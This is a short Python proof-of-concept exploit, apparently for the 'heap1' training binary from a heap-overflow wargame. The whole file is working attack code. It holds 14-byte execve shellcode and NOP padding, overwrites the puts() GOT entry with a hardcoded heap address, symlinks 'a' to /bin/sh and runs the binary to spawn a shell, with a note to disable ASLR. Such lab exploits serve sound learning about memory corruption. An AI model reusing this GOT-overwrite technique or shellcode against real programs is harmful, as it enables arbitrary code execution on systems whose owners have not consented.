# heap1-PoC by @Pink_P4nther <pinkp4nther@protonmail.com>
# Be sure to disable ASLR! Unless you want to make it even more fun then sure leave it on ;}

import subprocess
import os

# Shellcode 14 byte shellcode execve("a");
# http://shell-storm.org/shellcode/files/shellcode-589.php
buf = "\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80"

# 6 bytes to fill the rest of the heap block to create the correct number of bytes (20 bytes) before the GOT address
pad = "\x90"*6

# GOT address of the puts() call (The address we will write to)
GOTPutsAddr = "\x74\x97\x04\x08" #0x8049774

# The address of our shellcode on the heap we will be writing to the puts() GOT entry @ address 0x8049774
GOTVal = "\x18\xa0\x04\x08" #0x0804a018

print("[*] Lets pop a shell pinky!")
print("[*] Creating Link: a -> /bin/sh")

# Created a link called 'a' that points to /bin/sh (this allows our shellcode to be smaller!)
os.system("ln -s /bin/sh a")

# Split up our entire buffer into two arguments
arg1 = buf+pad+GOTPutsAddr
arg2 = GOTVal

print("[*] Popping Shell!")

# Calls the heap1 binary with our two arguments
subprocess.call(["heap1",arg1,arg2])

